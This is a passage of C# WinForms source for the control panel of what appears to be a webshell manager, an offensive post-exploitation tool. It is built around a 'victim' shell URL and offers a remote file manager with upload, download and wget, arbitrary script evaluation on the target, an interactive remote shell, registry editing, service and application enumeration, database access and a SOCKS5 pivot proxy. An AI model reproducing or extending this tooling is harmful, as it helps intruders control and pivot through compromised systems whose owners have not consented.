            frmRegEditBytes f = new frmRegEditBytes(m_winReg, m_winReg.m_szCurrentPath, szName, szType, abValue);
            f.Text = "Edit Bytes";

            f.ShowDialog();

            fnRegRefresh();
        }
        private void fnRegSetValue(string szName, string szType, string[] asData)
        {
            frmRegEditMultiString f = new frmRegEditMultiString(m_winReg, m_winReg.m_szCurrentPath, szName, szType, asData);
            f.Text = "Edit Value";

            f.ShowDialog();

            fnRegRefresh();
        }

        #endregion
        # region Application

        async Task fnWinGetApp()
        {
            toolStripStatusLabel9.Text = "Loading...";

            var json = await m_infoSpyder.fnGetAppServ();

            if (json == null)
                throw new Exception("JSON object is null");

            if (!json.success)
                throw new Exception(json.error);

            listView16.View = View.Details;

            listView16.Items.Clear();
            listView16.Columns.Clear();

            listView16.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
            listView16.Columns.Add(new ColumnHeader() { Text = "Version", Width = 120, });
            listView16.Columns.Add(new ColumnHeader() { Text = "Vendor", Width = 120, });

            foreach (var app in json.data.applications)
            {
                ListViewItem item = new ListViewItem(app.name);
                item.SubItems.Add(app.version);
                item.SubItems.Add(app.vendor);

                listView16.Items.Add(item);
            }

            toolStripStatusLabel9.Text = $"Application[{listView16.Items.Count}]";
        }

        async Task fnWinGetService()
        {
            toolStripStatusLabel10.Text = "Loading...";

            var json = await m_infoSpyder.fnGetAppServ();

            if (json == null)
                throw new Exception("JSON object is null");

            if (!json.success)
                throw new Exception(json.error);

            listView17.View = View.Details;

            listView17.Items.Clear();
            listView17.Columns.Clear();

            listView17.Columns.Add(new ColumnHeader() { Text = "Name", Width = 200, });
            listView17.Columns.Add(new ColumnHeader() { Text = "DisplayName", Width = 200, });
            listView17.Columns.Add(new ColumnHeader() { Text = "Status", Width = 200, });

            foreach (var service in json.data.services)
            {
                ListViewItem item = new ListViewItem(service.display_name);
                item.SubItems.Add(service.display_name);
                item.SubItems.Add(service.status);

                listView17.Items.Add(item);
            }

            toolStripStatusLabel10.Text = $"Application[{listView17.Items.Count}]";
        }

        #endregion
        #endregion

        /// <summary>
        /// Load and display all plugins
        /// </summary>
        /// <param name="szCurrentDir"></param>
        /// <param name="currentNodes"></param>
        /// <param name="szFilter"></param>
        /// <returns>Number of plugins</returns>
        private async Task<int> fnLoadAllPlugins(string szCurrentDir, TreeNodeCollection currentNodes, string szFilter = "")
        {
            int nPluginCount = 0;

            try
            {
                string[] aszSubDirs = await Task.Run(() => Directory.GetDirectories(szCurrentDir));

                foreach (string szDirName in aszSubDirs)
                {
                    try
                    {
                        string szFolderName = Path.GetFileName(szDirName);
                        TreeNode nodeDir = new TreeNode(szFolderName);

                        var manifest = await Task.Run(() => m_plugin.fnLoadPluginManifest(szDirName));
                        bool bAddNode = false;
                        bool bIsPlugin = false;

                        if (manifest != null && manifest.HasValue)
                        {
                            var info = manifest.Value;

                            if (m_plugin == null || toolStripComboBox1 == null || info.lsEnvironment == null || m_plugin.m_szEnvironment == null)
                                return 0;

                            if (toolStripComboBox1.SelectedIndex == 0 && !info.lsEnvironment.Contains(m_plugin.m_szEnvironment))
                            {
                                bAddNode = false;
                            }
                            else
                            {
                                bAddNode = true;
                                bIsPlugin = true;
                            }
                        }
                        else
                        {
                            string szIndexPath = Path.Combine(szDirName, "index.html");
                            bool bFileExists = await Task.Run(() => File.Exists(szIndexPath));
                            if (bFileExists)
                            {
                                bAddNode = true;
                            }
                        }

                        if (bAddNode && !string.IsNullOrEmpty(szFilter))
                        {
                            if (szFolderName.IndexOf(szFilter, StringComparison.OrdinalIgnoreCase) < 0)
                            {
                                bAddNode = false;
                                bIsPlugin = false;
                            }
                        }

                        if (bAddNode)
                        {
                            nPluginCount++;
                        }

                        if (bIsPlugin)
                        {
                            nodeDir.ImageKey = "sword";
                            nodeDir.SelectedImageKey = "sword";
                        }
                        else
                        {
                            nodeDir.ImageKey = "folder";
                            nodeDir.SelectedImageKey = "folder";
                        }

                        int nSubCount = await fnLoadAllPlugins(szDirName, nodeDir.Nodes, szFilter);
                        nPluginCount += nSubCount;

                        if (bAddNode || nodeDir.Nodes.Count > 0)
                        {
                            currentNodes.Add(nodeDir);
                        }
                    }
                    catch (NullReferenceException)
                    {
                        return 0;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            return nPluginCount;
        }

        private int fnCountNodes(TreeNode node)
        {
            int count = node.Nodes.Count;
            foreach (TreeNode subNode in node.Nodes)
            {
                count += fnCountNodes(subNode);
            }

            return count;
        }

        async void fnClose()
        {
            timerShell.Stop();

            m_lan.fnStop();
            m_socks5.fnStop();

            //await m_web.DisposeAsync();
        }

        /// <summary>
        /// Initialize plugin system.
        /// </summary>
        async void fnPluginInit()
        {
            try
            {
                string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
                string? szPayloadType = Enum.GetName(typeof(enPayloadType), m_victim.ShellPayloadType);

                if (string.IsNullOrEmpty(szLang))
                {
                    MessageBox.Show("Failed to convert shell script language", "Null", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (string.IsNullOrEmpty(szPayloadType))
                {
                    MessageBox.Show("Failed to convert payload type", "Null", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                string szEnv = Path.Combine(szLang, m_victim.ShellMethod, szPayloadType).Replace("\\", "/");

                await webViewPlugin.EnsureCoreWebView2Async(null);
                webViewPlugin.CoreWebView2.AddHostObjectToScript("nativeBridge", new clsfnPlugin.clsBridge(m_web, szEnv));

                string szHtmlPath = Path.Combine(m_plugin.m_szPluginsDir, "index.html");
                webViewPlugin.CoreWebView2.Navigate(szHtmlPath);

                toolStripComboBox1.SelectedIndex = 0;
            }
            catch
            {
                return;
            }
        }

        async void fnSetup()
        {
            /*
            if (!await fnbValidator())
            {
                MessageBox.Show("Validation failed", "fnbValidator()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            */

            // Clear status labels
            toolStripStatusLabel1.Text = string.Empty;
            toolStripStatusLabel2.Text = string.Empty;
            toolStripStatusLabel4.Text = "Loading...";
            toolStripStatusLabel5.Text = string.Empty;
            toolStripStatusLabel6.Text = string.Empty;
            toolStripStatusLabel7.Text = string.Empty;
            toolStripStatusLabel8.Text = "Loading...";

            toolStripLabel2.Text = string.Empty;

            textBox8.Text = m_victim.ShellURL;

            treeView3.ImageList = fileImageList;
            m_fileMgr.m_ExtIcon.Images.Add(fileImageList.Images["folder"]);
            m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
            listView2.SmallImageList = m_fileMgr.m_ExtIcon;

            tabPage1.Controls.Add(m_ctrlInfoBrowser);
            m_ctrlInfoBrowser.Dock = DockStyle.Fill;
            m_ctrlInfoBrowser.BringToFront();

            splitContainer4.Panel1.Controls.Add(m_ctrlEvalBrowser);
            tabControl5.TabPages[0].Controls.Add(m_ctrlEvalEditor);
            tabControl5.TabPages[1].Controls.Add(m_ctrlPostEditor);
            m_ctrlEvalBrowser.Dock = DockStyle.Fill;
            m_ctrlEvalEditor.Dock = DockStyle.Fill;
            m_ctrlPostEditor.Dock = DockStyle.Fill;
            m_ctrlEvalBrowser.BringToFront();
            m_ctrlEvalEditor.BringToFront();
            m_ctrlPostEditor.BringToFront();

            toolStripStatusLabel3.Text = string.Empty;

            listView11.FullRowSelect = true;
            listView12.FullRowSelect = true;
            listView16.FullRowSelect = true;
            listView17.FullRowSelect = true;

            // Plugins

            fnPluginInit();

            //Information
            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();

            //FileMgr

            var fileInit = new clsfnFileMgr.stInit();

            try
            {
                fileInit = await m_fileMgr.fnszInit();

                textBox1.Text = fileInit.szCurrentDir;
                m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
                foreach (string szName in fileInit.lsLogicalDrive)
                {
                    TreeNode node = new TreeNode(szName);
                    node.ImageKey = "harddrive";
                    treeView3.Nodes.Add(node);
                }

                fnFileAddPathToTreeView(fileInit.szCurrentDir);
                treeView3.ExpandAll();

                TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
                treeView3.SelectedNode = cdNode;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);

                return;
            }

            //Shell

            richTextBox2.Font = new Font("Consolas", Font.Size);
            textBox3.Text = "whoami";
            textBox4.Text = "powershell.exe";
            textBox6.Text = "/bin/bash";

            m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
            fnShellInit();

            tabControl8.Appearance = TabAppearance.FlatButtons;
            tabControl8.ItemSize = new Size(0, 1);
            tabControl8.SizeMode = TabSizeMode.Fixed;

            string szBaseDir = AppDomain.CurrentDomain.BaseDirectory;
            string szRelativePath = Path.Combine("Tools", "xterm", m_victim.m_bUnixLike ? "linux.html" : "windows.html");
            string szAbsolutePath = Path.Combine(szBaseDir, szRelativePath);

            await webViewShell.EnsureCoreWebView2Async(null);
            webViewShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsoluteUri);
            webViewShell.CoreWebView2.WebMessageReceived += async (s, e) =>
            {
                string rawMsg = e.TryGetWebMessageAsString();

                var parts = rawMsg.Split('|');
                if (parts.Length < 2 || parts[0] != "xterm")
                    return;

                string action = parts[1];

                if (action == "input")
                {
                    string b64Data = parts[2];
                    await m_rShell.fnPipeWrite(b64Data);
                }
                else if (action == "resize")
                {
                    string cols = parts[2];
                    string rows = parts[3];
                    await m_rShell.fnPipeResize(cols, rows);
                }
            };
            webViewShell.SizeChanged += async (s, e) =>
            {
                if (webViewShell.CoreWebView2 != null)
                    await webViewShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            };

            await webViewLinuxShell.EnsureCoreWebView2Async(null);
            webViewLinuxShell.CoreWebView2.Navigate(new Uri(szAbsolutePath).AbsolutePath);
            webViewLinuxShell.CoreWebView2.WebMessageReceived += async (s, e) =>
            {
                string rawMsg = e.TryGetWebMessageAsString();

                var parts = rawMsg.Split('|');
                if (parts.Length < 2 || parts[0] != "xterm")
                    return;

                string action = parts[1];

                if (action == "input")
                {
                    string b64Data = parts[2];
                    await m_rShell.fnPipeWrite(b64Data);
                }
                else if (action == "resize")
                {
                    string cols = parts[2];
                    string rows = parts[3];
                    await m_rShell.fnPipeResize(cols, rows);
                }
            };
            webViewLinuxShell.SizeChanged += async (s, e) =>
            {
                await webViewLinuxShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            };

            tabControl8.SelectedIndex = m_victim.m_bUnixLike ? 1 : 0;

            //Database
            fnDbInit();

            tabControl4.AllowDrop = true;
            tabControl4.Padding = new Point(30, 3);
            tabControl4.DrawMode = TabDrawMode.OwnerDrawFixed;

            new TabZeroHook(tabControl4);

            tabControl4.DrawItem += (s, e) =>
            {
                using (Brush bg = new SolidBrush(ThemeManager.Current.ControlBackColor))
                {
                    if (tabControl4.TabCount == 0)
                    {
                        e.Graphics.FillRectangle(bg, tabControl4.ClientRectangle);
                        return;
                    }

                    if (e.Index == tabControl4.TabCount - 1)
                    {
                        Rectangle lastTabRect = tabControl4.GetTabRect(e.Index);
                        if (lastTabRect.Right < tabControl4.Width)
                        {
                            Rectangle leftover = new Rectangle(
                                lastTabRect.Right,
                                lastTabRect.Top,
                                tabControl4.Width - lastTabRect.Right,
                                lastTabRect.Height);

                            e.Graphics.FillRectangle(bg, leftover);
                        }
                    }
                }

                if (e.Index < 0 || e.Index >= tabControl4.TabPages.Count)
                    return;

                TabPage page = tabControl4.TabPages[e.Index];
                Rectangle rect = tabControl4.GetTabRect(e.Index);

                bool selected = e.Index == tabControl4.SelectedIndex;

                // tab background
                using (Brush bg = new SolidBrush(ThemeManager.Current.ControlBackColor))
                {
                    e.Graphics.FillRectangle(bg, rect);
                }

                // selected highlight
                if (selected)
                {
                    using (Brush accent = new SolidBrush(ThemeManager.Current.AccentColor))
                    {
                        e.Graphics.FillRectangle(accent, new Rectangle(rect.Left + 5, rect.Bottom - 3, rect.Width - 10, 3));
                    }
                }

                // text
                TextRenderer.DrawText(
                    e.Graphics,
                    page.Text,
                    e.Font,
                    rect,
                    selected ? ThemeManager.Current.AccentColor : ThemeManager.Current.ForeColor,
                    TextFormatFlags.HorizontalCenter |
                    TextFormatFlags.VerticalCenter
                );

                // X button
                Rectangle closeRect = fnGetCloseRect(e.Index);

                using (Pen pen = new Pen(ThemeManager.Current.ForeColor, 2))
                {
                    e.Graphics.DrawLine(pen, closeRect.Left + 4, closeRect.Top + 4, closeRect.Right - 4, closeRect.Bottom - 4);
                    e.Graphics.DrawLine(pen, closeRect.Right - 4, closeRect.Top + 4, closeRect.Left + 4, closeRect.Bottom - 4);
                }
            };

            tabControl4.MouseDown += (s, e) =>
            {
                int nIdx = fnGetTabIndexAt(e.Location);
                if (nIdx == -1)
                    return;

                if (fnGetCloseRect(nIdx).Contains(e.Location))
                {
                    tabControl4.TabPages.RemoveAt(nIdx);
                    return;
                }

                if (e.Button != MouseButtons.Left)
                    return;

                draggedTab = tabControl4.TabPages[nIdx];

                tabControl4.DoDragDrop(draggedTab, DragDropEffects.Move);
            };

            tabControl4.DragOver += (s, e) =>
            {
                e.Effect = DragDropEffects.Move;
            };

            tabControl4.DragDrop += (s, e) =>
            {
                Point p = tabControl4.PointToClient(new Point(e.X, e.Y));
                int nIdx = fnGetTabIndexAt(p);

                if (nIdx < 0 || draggedTab == null)
                    return;

                int oldIdx = tabControl4.TabPages.IndexOf(draggedTab);

                if (oldIdx == -1 || oldIdx == nIdx)
                    return;

                tabControl4.TabPages.Remove(draggedTab);

                if (nIdx > oldIdx)
                    nIdx--;

                nIdx = Math.Max(0, Math.Min(nIdx, tabControl4.TabPages.Count));

                tabControl4.TabPages.Insert(nIdx, draggedTab);

                tabControl4.SelectedTab = draggedTab;

                draggedTab = null;
            };

            tabControl4.DragLeave += (s, e) =>
            {
                draggedTab = null;
            };

            // Eval Script

            if (m_dicEvalScript.ContainsKey(m_victim.ShellLanguage))
            {
                m_ctrlEvalEditor.Text = m_dicEvalScript[m_victim.ShellLanguage](m_victim.ShellPayloadType);
                m_ctrlEvalEditor.Refresh();
            }

            // Linux / Windows

            if (m_victim.m_bUnixLike)
            {
                // Linux

                TabPage page = tabPage16;
                tabControl1.TabPages.Remove(page);


                try
                {
                    await fnLinuxGetApp();
                    await fnLinuxGetService();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
            else
            {
                // Windows

                TabPage page = tabPage15;
                tabControl1.TabPages.Remove(page);

                try
                {
                    await fnWinUserInit();
                    await fnRegInit();
                    await fnWinGetApp();
                    await fnWinGetService();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }

                toolStripStatusLabel4.Text = "Action successfully.";
            }

            // SOCKS5
            listView13.FullRowSelect = true;
            button4.Enabled = false;

            m_socks5.OnConnected += (ip, port) =>
            {
                string szHost = $"{ip}:{port}";
                string szDt = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture);

                ListViewItem item = new ListViewItem(szHost);
                item.SubItems.Add("SOCKS5");
                item.SubItems.Add(szDt);

                Invoke(() => listView13.Items.Add(item));
            };
            m_socks5.OnDisconnected += (ip, port) =>
            {
                string szHost = $"{ip}:{port}";
                ListViewItem? item = null;
                Invoke(() => item = listView13.FindItemWithText(szHost));

                if (item == null)
                    return;

                Invoke(() => listView13.Items.Remove(item));
            };
            m_socks5.OnListened += (port) =>
            {
                Invoke(() =>
                {
                    button3.Enabled = false;
                    button4.Enabled = true;
                });
            };
            m_socks5.OnStopped += (port) =>
            {
                Invoke(() =>
                {
                    button3.Enabled = true;
                    button4.Enabled = false;
                });
            };

            // Void
            listView14.BackColor = Color.Black;
            listView14.ForeColor = Color.Lime;
            listView14.Refresh();

            richTextBox3.BackColor = Color.Black;
            richTextBox3.ForeColor = Color.Lime;
            richTextBox3.Refresh();

            // Note
            try
            {
                string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                string szContent = Path.Exists(szFilePath) ? File.ReadAllText(szFilePath) : string.Empty;

                textEditorControl1.Text = szContent;

                textEditorControl1.TextChanged += (s, e) =>
                {
                    toolStripStatusLabel7.Text = "Have not saved (Please save it before you close the control panel)";
                };
                textEditorControl1.ActiveTextAreaControl.TextArea.KeyDown += (s, e) =>
                {
                    if (e.Control && e.KeyCode == Keys.S)
                    {
                        e.Handled = true;

                        try
                        {
                            string szFilePath = Path.Combine(m_victim.m_szPortfolio, "note.txt");
                            File.WriteAllText(szFilePath, textEditorControl1.Text);

                            toolStripStatusLabel7.Text = "Saved";
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                    }
                };
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void frmControlPanel_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void treeView3_AfterSelect(object sender, TreeViewEventArgs e)
        {
            toolStripStatusLabel2.Text = "Loading...";

            TreeNode node = treeView3.SelectedNode;
            node.SelectedImageKey = node.ImageKey;
            string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
            fnFileScandir(szDir);
        }

        //File.Parent
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node != null && node.Parent != null)
                treeView3.SelectedNode = node.Parent;
        }
        //File.Home
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node != null)
                treeView3.SelectedNode = node;
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //File.Copy
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            var lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).ToList();

            m_fileMgr.m_dirClipboard = lsDir;
            m_fileMgr.m_fileClipboard = lsFile;
            m_fileMgr.m_moveClipboard = false;
        }
        //File.Cut
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            var lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).ToList();

            m_fileMgr.m_dirClipboard = lsDir;
            m_fileMgr.m_fileClipboard = lsFile;
            m_fileMgr.m_moveClipboard = true;
        }
        //File.Paste
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            frmFileCopyMoveProgress f = new frmFileCopyMoveProgress(m_fileMgr, m_fileMgr.m_szCurrentPath);
            f.ShowDialog();

            fnFileMgrRefresh();
        }
        //File.Image.ShowAll
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            fnFileDisplayAllImage();
        }
        //File.Image.ShowSelected
        private async void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            List<string> lsFilePath = new List<string>();

            foreach (ListViewItem item in listView2.SelectedItems)
            {
                var entry = fnFileGetItemTag(item);
                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
                    lsFilePath.Add(entry.szEntryPath);
            }

            await fnFileDisplayImage(lsFilePath);
        }

        private async void toolStripButton3_Click(object sender, EventArgs e)
        {
            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
        }

        private void listView2_DoubleClick(object sender, EventArgs e)
        {
            List<ListViewItem> lItem = listView2.SelectedItems.Cast<ListViewItem>().ToList();
            if (lItem.Count == 0)
                return;

            var entry = fnFileGetItemTag(lItem[0]);
            if (entry.bIsDirectory)
            {
                TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                if (node != null)
                    treeView3.SelectedNode = node;
            }
            else
            {
                fnFileRead(entry.szEntryPath);
            }
        }

        private void listView2_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {
                if (e.KeyCode == Keys.A)
                {
                    listView2.Items.Cast<ListViewItem>().Select(x => x.Selected = true);
                }
            }
            else
            {
                if (e.KeyCode == Keys.F5)
                {
                    fnFileScandir(m_fileMgr.m_szCurrentPath);
                }
                else if (e.KeyCode == Keys.Enter)
                {
                    foreach (ListViewItem item in listView2.SelectedItems)
                    {
                        var entry = fnFileGetItemTag(item);
                        if (entry.bIsDirectory)
                            treeView3.SelectedNode = fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath);
                        else
                            fnFileRead(entry.szEntryPath);
                    }
                }
            }
        }



        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                fnFileDirExists(textBox1.Text);
            }
        }

        //File.NewFolder
        private async void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            string szDirName = Interaction.InputBox("Dir Name: ", "Create New Directory", $"Folder_{DateTime.Now.ToString("yyyyMMddHHmmssfff")}");
            if (string.IsNullOrEmpty(szDirName))
            {
                MessageBox.Show("Directory name cannot be null or empty.", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            szDirName = Path.Combine(m_fileMgr.m_szCurrentPath, szDirName).Replace("\\", "/").Replace("//", "/");

            if (await m_fileMgr.fnbNewFolder(szDirName))
            {
                MessageBox.Show("Created the directory successfully!", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
            else
            {
                MessageBox.Show("Failed to create a new directory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        //File.NewFile
        private void toolStripMenuItem16_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        //File.NewFile
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            fnFileNewFile();
        }

        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {

        }

        //File.NewFolder
        private async void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            string szDirName = Interaction.InputBox("Dir Name: ", "Create New Directory", $"Folder_{DateTime.Now.ToString("yyyyMMddHHmmssfff")}");
            if (string.IsNullOrEmpty(szDirName))
            {
                MessageBox.Show("Directory name cannot be null or empty.", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            szDirName = Path.Combine(m_fileMgr.m_szCurrentPath, szDirName).Replace("\\", "/").Replace("//", "/");

            if (await m_fileMgr.fnbNewFolder(szDirName))
            {
                MessageBox.Show("Created the directory successfully!", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
            else
            {
                MessageBox.Show("Failed to create a new directory.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);

            f.ShowDialog();
        }

        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
        {
            
        }

        //Upload
        private async void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Multiselect = true;

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                List<string> lsSrcFiles = ofd.FileNames.ToList();

                tabControl6.SelectedIndex = 1;

                await fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
            }
        }

        //Download
        private async void toolStripMenuItem9_Click(object sender, EventArgs e)
        {
            List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            var lsDir = lsEntry.Where(x => x.bIsDirectory).Select(x => x.szEntryPath).ToList();
            var lsFile = lsEntry.Where(x => !x.bIsDirectory).Select(x => (x.szEntryPath, x.nSize)).ToList();

            tabControl6.SelectedIndex = 1;

            var result = await fnFileDownload(lsFile);
            var dicState = result.dicState;
            var szSaveDirPath = result.szSaveDirPath;

            if (dicState.Values.Any(x => x == true))
            {
                DialogResult dr = MessageBox.Show(
                    "Downloading task is completed, do you want to open the save folder?",
                    "Finished",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question
                );

                if (dr == DialogResult.Yes)
                {
                    Process.Start("explorer.exe", szSaveDirPath);
                }
            }
            else
            {
                MessageBox.Show("Failed", "Download File", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        //WGET
        private void toolStripMenuItem10_Click(object sender, EventArgs e)
        {
            frmWGET f = new frmWGET(m_fileMgr, this, m_fileMgr.m_szCurrentPath);
            f.Show();
        }

        //Parent
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szCurrentPath);
            if (node == null || node.Parent == null)
                return;

            treeView3.SelectedNode = node.Parent;
        }

        //Home
        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, m_fileMgr.m_szHomePath);
            if (node == null)
                return;

            treeView3.SelectedNode = node;
        }

        //Delete
        private async void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            List<clsfnFileMgr.stEntry> lsEntry = listView2.SelectedItems.Cast<ListViewItem>().Select(x => fnFileGetItemTag(x)).ToList();
            if (lsEntry.Count == 0)
                return;

            if (DialogResult.Yes != MessageBox.Show($"Are you sure to delete {lsEntry.Count} file{(lsEntry.Count > 1 ? "s" : string.Empty)}?", "Wait!", MessageBoxButtons.YesNo, MessageBoxIcon.Question))
                return;

            bool bFlag = true;
            foreach (var entry in lsEntry)
            {
                if (!await fnbFileDelete(entry))
                {
                    bFlag = false;
                    MessageBox.Show("Failed to delete: " + entry.szEntryPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            if (bFlag)
            {
                MessageBox.Show($"Delete {lsEntry.Count} file{(lsEntry.Count > 1 ? "s" : string.Empty)} successfully.", "OK!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                fnFileMgrRefresh();
            }
        }

        //Find
        private async void toolStripButton4_Click_1(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            listView1.SmallImageList = m_fileMgr.m_ExtIcon;

            string szPattern = textBox10.Text;
            string[] aDir = textBox9.Text.Split(Environment.NewLine);

            try
            {
                var result = await m_fileMgr.fnFileSearch(szPattern, aDir);
                if (result == null)
                {
                    MessageBox.Show("JSON deserialization is failed!", "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (!result.Status)
                {
                    MessageBox.Show(result.Msg, "Find", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                List<clsfnFileMgr.stEntry> entries = new List<clsfnFileMgr.stEntry>();

                foreach (var item in result.Results)
                {
                    entries.Add(new clsfnFileMgr.stEntry()
                    {
                        szEntryPath = item.Path,
                        bIsDirectory = string.Equals(item.Type, "Directory"),
                        szPriviledge = item.Permission,
                        dtCreationDate = DateTime.Parse(item.Created),
                        dtLastModifiedDate = DateTime.Parse(item.LastModified),
                        dtLastAccessedDate = DateTime.Parse(item.LastAccessed)
                    });
                }

                var dirs = entries.Where(x => x.bIsDirectory).ToList();
                var files = entries.Where(x => !x.bIsDirectory).ToList();

                entries.Clear();
                entries = dirs.Concat(files).ToList();

                foreach (var entry in entries)
                {
                    ListViewItem item = new ListViewItem(entry.szEntryName);

                    string szExtension = entry.szEntryName.Split('.').Last();
                    if (!entry.bIsDirectory)
                        m_fileMgr.fnGetExtensionIcon(szExtension);

                    item.ImageKey = entry.bIsDirectory ? "folder" : szExtension;

                    item.Tag = entry;

                    item.SubItems.Add(entry.szEntryPath);
                    item.SubItems.Add(entry.szPriviledge);
                    item.SubItems.Add(entry.dtCreationDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));
                    item.SubItems.Add(entry.dtLastModifiedDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));
                    item.SubItems.Add(entry.dtLastAccessedDate.ToString("yyyy-MM-dd HH:mm:ss", CultureInfo.InvariantCulture));

                    listView1.Items.Add(item);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        // Eval script
        private async void toolStripButton7_Click(object sender, EventArgs e)
        {
            toolStripStatusLabel3.Text = "Loading...";

            string szCode = m_ctrlEvalEditor.Text;
            string szResp = await m_runScript.fnszRunScript(szCode);
            m_ctrlEvalBrowser.DocumentText = szResp;

            toolStripStatusLabel3.Text = "Run code is executed.";
        }

        // Database.Add
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            frmDbEdit f = new frmDbEdit(m_dbMgr, this);
            f.ShowDialog();
        }

        // Database.Reload
        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            fnDbInit();
        }

        private async void treeView2_DoubleClick(object sender, EventArgs e)
        {
            TreeNode node = treeView2.SelectedNode;
            if (node == null)
                return;

            if (node.Parent == null)
            {
                //Show databases

                toolStripLabel2.Text = "Loading...";

                var config = m_dbMgr.m_stDbConfig[node.Text];
                var result = await m_dbMgr.fnSqlQueryEx(config, m_dbMgr.m_dicShowDatabaseSQL[config.enDbType]);

                if (result == null)
